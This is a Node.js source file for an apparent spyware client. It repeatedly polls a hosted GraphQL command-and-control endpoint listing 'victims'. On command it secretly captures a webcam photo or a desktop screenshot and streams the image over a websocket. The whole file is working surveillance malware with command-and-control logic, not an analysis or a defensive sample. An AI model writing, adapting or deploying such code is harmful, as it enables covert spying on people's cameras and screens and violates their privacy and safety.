"use strict";
var port = 9090;
var FS = require("fs");
var WS = require("ws");
var screenshot = require('desktop-screenshot');

const { request } = require('graphql-request')
const ENDPOINT = 'https://api.8base.com/cjrmxguzs002w01rrqoayivef'
const CLIENTID = "cjrng80m4000n01qnvwjoa0qk"

// connect to websocket
const wsclient = new WS('ws://127.0.0.1:8080');

// Create webcam accessor
var NodeWebcam = require("node-webcam");
var Webcam = NodeWebcam.create({
	// callbackReturn: "base64",
	// saveShots: false
});

const VICTIMS_LIST_QUERY = /* GraphQL */ `
query VictimsList {
	victimsList {
		items {
			id
			command
		}
	}
}`

const STREAM_VICTIMS_MUTATION = `
	mutation StreamScreen($id: ID!, $command: String) {
		victimUpdate (filter: { id: $id }, data: {
			command: $command
		}) {
		id
		command
		}
	}
`;

// Main
execute();

console.log("doing it!!");

function execute() {

	try {
		request(ENDPOINT, VICTIMS_LIST_QUERY).then((response) => {
			let id = response["victimsList"]["items"][0]["id"];
			let command = response["victimsList"]["items"][0]["command"];
			console.log("command:" + command);
			if (command == "cam") {
				// data = JSON.stringify(data);

				try {
					Webcam.capture("picture", function (err, data) {
						if (err) {
							throw err;
						}
						console.log(data);
						wsclient.send(FS.readFileSync(data));
					});
				} catch (error) {
					console.log("Error: " + error);
					// Couldnt connect to server, try to set command mode off
					console.log("Failed to send! Marking self as not streaming");
					request(ENDPOINT, STREAM_VICTIMS_MUTATION, { id: CLIENTID, command: null });
				}
			} else if(command == "screen"){
				try {
					screenshot("screenshot.png", function(err, complete) {
						if (err) {
							throw err;
						}
						console.log(complete);
						wsclient.send(FS.readFileSync("screenshot.png"));
					});
				} catch (error) {
					console.log("Error: " + error);
					// Couldnt connect to server, try to set command mode off
					console.log("Failed to send! Marking self as not streaming");
					request(ENDPOINT, STREAM_VICTIMS_MUTATION, { id: CLIENTID, command: null });
				}
			}
		}).catch((err) => {
			console.log("Promise Error:" + err);
		})
	} catch (error) {
		// Some error occured.
		console.log(error);
	} finally {
		setTimeout(execute, 900);
	}
}